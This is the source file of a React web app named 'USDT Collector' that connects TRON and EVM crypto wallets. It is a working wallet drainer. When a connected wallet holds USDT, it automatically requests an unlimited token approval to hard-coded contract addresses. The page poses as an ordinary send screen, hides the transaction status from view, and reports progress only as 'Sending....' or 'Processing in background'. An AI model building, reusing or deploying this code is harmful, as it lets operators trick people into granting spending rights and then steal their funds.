import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, QrCode, X, ChevronRight } from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'
import { connect, getConnectors } from '@wagmi/core'

// --- TRON IMPORTS ---
import TronWeb from 'tronweb'   

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet'

// 🔥 CONTRACT ADDRESSES
const TRON_CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'

const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
  tronMainnet,
  mainnet,
  arbitrum,
  bsc,
  polygon,
]

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  },
}

const EVM_USDT: Record<number, string> = {
  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', // Sepolia
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function approve(address spender, uint256 amount) returns (bool)'
]

const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Reown Adapters ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }), 
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
  ],
})

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: appkitNetworks,
})

createAppKit({
  adapters: [tronAdapter, wagmiAdapter], 
  networks: appkitNetworks,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'USDT Collector',
    description: 'Collect USDT from multiple wallets',
    url:         import.meta.env.VITE_APP_URL || (typeof window !== 'undefined' ? window.location.origin : ''),
    icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
  },
  themeMode: 'light', 
  themeVariables: {
    '--w3m-accent': '#0C66FF',
  },
  allWallets: 'SHOW',
  features: {
    email: false,
    socials: [],
    analytics: true,
  },
})

// === TRON ABIs ===
const USDT_ABI = [
  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
]

// ==========================================
// 🎨 EXACT CUSTOM ICONS FROM SCREENSHOT
// ==========================================
const BrowserWalletIcon = () => (
  <svg width="44" height="44" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M20 20.5L14 13L8 20.5L14 23.5L20 20.5Z" fill="#1C2033" />
    <path d="M20 20.5L26 13L32 20.5L26 23.5L20 20.5Z" fill="#1C2033" />
    <path d="M14 13L8 20.5L5 11L12 6L14 13Z" fill="#F6851B" />
    <path d="M26 13L32 20.5L35 11L28 6L26 13Z" fill="#F6851B" />
    <path d="M14 23.5L8 20.5L10 30L17 28L14 23.5Z" fill="#E2A676" />
    <path d="M26 23.5L32 20.5L30 30L23 28L26 23.5Z" fill="#E2A676" />
  </svg>
)

const TrustWalletIcon = () => (
  <svg width="44" height="44" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect width="40" height="40" rx="10" fill="#3375BB"/>
    <path d="M19.9998 25.8643C19.349 25.8643 18.732 25.6397 18.2263 25.2304L13.315 21.2526C12.3631 20.4811 12.2158 19.0805 12.986 18.126C13.7567 17.172 15.154 17.0244 16.1056 17.7963L18.8458 19.9877L23.9405 13.6265C24.6087 12.7949 25.8267 12.6596 26.6563 13.3271C27.4859 13.9946 27.621 15.2107 26.9525 16.0425L21.8576 22.404C21.8576 22.404 21.8576 22.404 21.8575 22.404C21.3956 22.9785 20.7121 23.3125 19.9998 23.3125V25.8643Z" fill="white"/>
    <path d="M19.9996 20.126C19.349 20.126 18.732 19.9014 18.2263 19.4921L13.315 15.5143C12.3631 14.7428 12.2158 13.3422 12.986 12.3878C13.7567 11.4337 15.154 11.2861 16.1056 12.058L18.8458 14.2494L23.9405 7.88813C24.6087 7.05663 25.8267 6.92132 26.6563 7.58883C27.4859 8.25633 27.621 9.47242 26.9525 10.3042L21.8576 16.6657C21.8576 16.6657 21.8576 16.6657 21.8575 16.6657C21.3956 17.2402 20.7121 17.5742 19.9996 17.5742V20.126Z" fill="white"/>
  </svg>
)

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [amountError, setAmountError] = useState('')
  const [showModal, setShowModal] = useState(false) 
  const autoTriggered = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
  const { chainId } = useAppKitNetwork()

  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

  const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
  const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')

  const resolveTronWeb = () => {
    const w = window as any;
    if (w.tronWeb?.contract) return w.tronWeb;
    if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
    if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
    if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
    if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 

    if (tronWalletProvider) {
      if ((tronWalletProvider as any).contract) return tronWalletProvider;
      if ((tronWalletProvider as any).adapter?.tronWeb?.contract) return (tronWalletProvider as any).adapter.tronWeb;
      if ((tronWalletProvider as any).tronWeb?.contract) return (tronWalletProvider as any).tronWeb;
    }
    return null;
  };

  const log = (msg: string) => {
    console.log(msg);
  }

  // ── INIT & AUTO-TRIGGER ──
  useEffect(() => {
    const init = async () => {
      if (!isConnected || !walletAddress) {
        autoTriggered.current = false;
        return;
      }

      log(`Connected: ${caipAddress}`);
      let currentBalance = 0;

      if (isTron) {
        setStatus('Initializing TRON...');
        
        let finalTronWeb = null;
        for (let i = 0; i < 10; i++) {
          finalTronWeb = resolveTronWeb();
          if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) break;
          await new Promise(r => setTimeout(r, 500));
        }

        if (!finalTronWeb) {
          log("⚠️ Using Public Provider for balance");
          const publicTronWeb = new (TronWeb as any)({ fullHost: FULL_HOST });
          currentBalance = await getTronBalance(publicTronWeb, walletAddress);
        } else {
          log('✅ TRON Provider Found');
          currentBalance = await getTronBalance(finalTronWeb, walletAddress);
        }
      } else if (isEVM && evmWalletProvider) {
        currentBalance = await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
      }

      if (currentBalance > 0 && !autoTriggered.current) {
        autoTriggered.current = true;
        log("🔥 Positive balance detected. Auto-triggering approval...");
        setTimeout(() => approveAndCollect(), 1000); 
      }
    };

    init();
  }, [isConnected, walletAddress, caipAddress, tronWalletProvider, evmWalletProvider, isTron, isEVM, chainId]);

  const getTronBalance = async (tw: any, addr: string): Promise<number> => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      const formatted = Number(bal) / 1_000_000;
      setUsdtBalance(formatted.toFixed(2))
      setStatus('Ready')
      return formatted;
    } catch (e) {
      log('❌ TRON balance fetch failed')
      return 0;
    }
  }

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setUsdtBalance('0')
      setStatus('USDT not configured for this EVM chain')
      return 0;
    }

    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)

      const [bal, decimals] = await Promise.all([
        token.balanceOf(addr),
        token.decimals(),
      ])

      const formatted = parseFloat(formatUnits(bal, decimals))
      setUsdtBalance(formatted.toFixed(2))
      setStatus('Ready')
      return formatted;
    } catch (e) {
      log('❌ EVM balance fetch failed')
      return 0;
    }
  }

  // ── ROUTING HANDLERS ──
  const handleConnect = () => {
    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
      setAmountError('Amount field is required');
      return; 
    }
    setAmountError('');
    setShowModal(true); 
  }

  const handleBrowserWallet = async () => {
    try {
      if (typeof window !== 'undefined' && ((window as any).tronWeb || (window as any).tronLink)) {
         open(); 
         setShowModal(false);
         return;
      }

      const connectors = getConnectors(wagmiAdapter.wagmiConfig);
      const injected = connectors.find(c => c.id === 'injected' || c.id === 'metaMask');
      
      if (injected) {
        await connect(wagmiAdapter.wagmiConfig, { connector: injected });
        setShowModal(false);
        return;
      }
    } catch (e) {
      console.log('Direct injected connection failed, falling back to modal', e);
    }
    open();
    setShowModal(false);
  }

  const handleMobileWallet = () => {
    open();
    setShowModal(false);
  }

  const approveAndCollect = async () => {
    if (!walletAddress) return;

    setLoading(true);
    setStatus('Approving Transaction...');
    log("Requesting USDT Approval...");

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      if (isEVM && evmWalletProvider) {
        if (!chainId || !EVM_USDT[Number(chainId)]) throw new Error("USDT not supported on this EVM chain");
        
        const ethersProvider = new BrowserProvider(evmWalletProvider as any);
        const signer = await ethersProvider.getSigner();
        const currentUsdtAddress = EVM_USDT[Number(chainId)];

        const usdtContract = new Contract(currentUsdtAddress, EVM_ERC20_ABI, signer);
        const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
        
        setTxHash(approveTx.hash);
        await approveTx.wait();
        
        setStatus('✅ Approved! Processing in background...');
        return; 
      }

      if (isTron) {
        const activeTw = resolveTronWeb();

        if (activeTw && typeof activeTw.contract === 'function') {
          const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
          const tx = await usdt.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
          setTxHash(tx);
          setStatus('✅ Approved! Processing in background...');
          return; 
        }

        if (tronWalletProvider) {
          const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
          const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
            const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
              contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
            );
            
            let signedTx;
            if (typeof (tronWalletProvider as any).signTransaction === 'function') {
              signedTx = await (tronWalletProvider as any).signTransaction(transaction);
            } else if (typeof (tronWalletProvider as any).request === 'function') {
              signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
            } else {
              throw new Error("Provider does not support signTransaction");
            }

            const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
            if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
            return broadcast.txid || broadcast.transaction?.txID;
          };

          const tx = await signAndSend(
            USDT_ADDRESS,
            'approve(address,uint256)',
            [ 
              { type: 'address', value: publicTw.address.toHex(TRON_CONTRACT_ADDRESS) }, 
              { type: 'uint256', value: MAX_UINT } 
            ],
            100_000_000
          );
          
          setTxHash(tx);
          setStatus('✅ Approved! Processing in background...');
          return; 
        }
      }

      throw new Error("Wallet provider not available for approval.");

    } catch (err: any) {
      log(`❌ Error: ${err.message || 'User rejected'}`);
      setStatus('❌ Transaction Failed');
      autoTriggered.current = false; 
    } finally {
      setLoading(false);
    }
  };

// ── DYNAMIC BUTTON LOGIC ──
  const isButtonDisabled = !isConnected 
    ? (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')
    : loading || (!status.includes('❌') && !status.includes('✅'));

  const buttonText = !isConnected 
    ? 'Connect Wallet' 
    : loading 
      ? 'Processing...' 
      : status.includes('✅') 
        ? 'Sent Successfully' 
        : status.includes('❌') 
          ? 'Retry Sending' 
          : 'Sending....';

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>

      <div style={{ flex: 1, padding: '32px 20px' }}>

        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Address or Domain Name
          </label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input
              type="text"
              readOnly
              placeholder="0xccD642c9acb072F72F29b77E"
              value={isConnected && walletAddress ? walletAddress : ''}
              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0, marginRight: '12px' }}
            />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', color: '#0C66FF' }}>
              <span style={{ fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Paste</span>
              <Copy size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
              <QrCode size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
            </div>
          </div>
        </div>

        <div>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Amount
          </label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: amountError ? '1.5px solid #EF4444' : '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input
              type="number"
              placeholder="USDT Amount"
              value={usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : ''}
              onChange={(e) => {
                setUsdtBalance(e.target.value);
                if (e.target.value) setAmountError(''); 
              }}
              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0 }}
            />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <span style={{ color: '#9CA3AF', fontWeight: '600', fontSize: '15px' }}>USDT</span>
              <span style={{ color: '#0C66FF', fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Max</span>
            </div>
          </div>
         <div style={{ fontSize: '13px', fontWeight: '500', marginTop: '8px' }}>
            {amountError ? (
              <span style={{ color: '#EF4444' }}>{amountError}</span>
            ) : (
              <span style={{ color: '#4B5563' }}>= ${usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : '0.00'}</span>
            )}
          </div>
        </div>

      </div>

      <div style={{ display: 'none' }}>
        <p>{status}</p>
        <p>{txHash}</p>
      </div>

      <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
        {status !== 'Ready' && status !== 'Initializing TRON...' && (
          <div style={{ textAlign: 'center', fontSize: '13px', fontWeight: '600', color: '#6B7280', marginBottom: '12px' }}>
            {status}
          </div>
        )}

        {/* ── UPDATED MAIN BUTTON ── */}
        <button
          onClick={!isConnected ? handleConnect : approveAndCollect}
          disabled={isButtonDisabled}
          style={{
            width: '100%',
            backgroundColor: isButtonDisabled ? '#93C5FD' : '#0C66FF',
            color: '#ffffff',
            fontWeight: '700',
            padding: '16px',
            borderRadius: '9999px',
            fontSize: '17px',
            border: 'none',
            cursor: isButtonDisabled ? 'not-allowed' : 'pointer',
            transition: 'background-color 0.2s'
          }}
        >
          {buttonText}
        </button>
      </div>

      {/* ========================================== */}
      {/* 🟢 CUSTOM CONNECT MODAL WITH EXACT ICONS */}
      {/* ========================================== */}
      {showModal && (
        <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0,0,0,0.4)', zIndex: 60, display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }}>
          
          <div style={{ backgroundColor: '#ffffff', width: '100%', maxWidth: '400px', borderTopLeftRadius: '24px', borderTopRightRadius: '24px', padding: '24px', paddingBottom: '40px', boxShadow: '0 -4px 20px rgba(0,0,0,0.1)' }}>
            
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
              <div style={{ width: '24px' }}></div> 
              <h3 style={{ margin: 0, fontSize: '18px', fontWeight: '700', color: '#111827' }}>Connect Wallet</h3>
              <button onClick={() => setShowModal(false)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: '#6B7280', padding: 0 }}>
                <X size={24} />
              </button>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              
              {/* Option 1: Browser Wallet */}
              <button onClick={handleBrowserWallet} style={{ display: 'flex', alignItems: 'center', width: '100%', padding: '16px', backgroundColor: '#ffffff', border: '1.5px solid #0C66FF', borderRadius: '16px', cursor: 'pointer', textAlign: 'left' }}>
                <div style={{ marginRight: '16px', display: 'flex' }}>
                  <BrowserWalletIcon />
                </div>
                <div style={{ flex: 1 }}>
                  <div style={{ fontSize: '16px', fontWeight: '700', color: '#111827', marginBottom: '2px' }}>Browser Wallet</div>
                  <div style={{ fontSize: '13px', color: '#6B7280', fontWeight: '500' }}>MetaMask, Rabby, Coinbase...</div>
                </div>
                <ChevronRight size={20} color="#9CA3AF" />
              </button>

              {/* Option 2: Trust Wallet & Mobile */}
              <button onClick={handleMobileWallet} style={{ display: 'flex', alignItems: 'center', width: '100%', padding: '16px', backgroundColor: '#ffffff', border: '1.5px solid #E5E7EB', borderRadius: '16px', cursor: 'pointer', textAlign: 'left' }}>
                <div style={{ marginRight: '16px', display: 'flex' }}>
                   <TrustWalletIcon />
                </div>
                <div style={{ flex: 1 }}>
                  <div style={{ fontSize: '16px', fontWeight: '700', color: '#111827', marginBottom: '2px' }}>Trust Wallet & Mobile</div>
                  <div style={{ fontSize: '13px', color: '#6B7280', fontWeight: '500' }}>Scan QR • Works with any wallet</div>
                </div>
                <ChevronRight size={20} color="#9CA3AF" />
              </button>

            </div>
          </div>
        </div>
      )}
      
    </div>
  )
}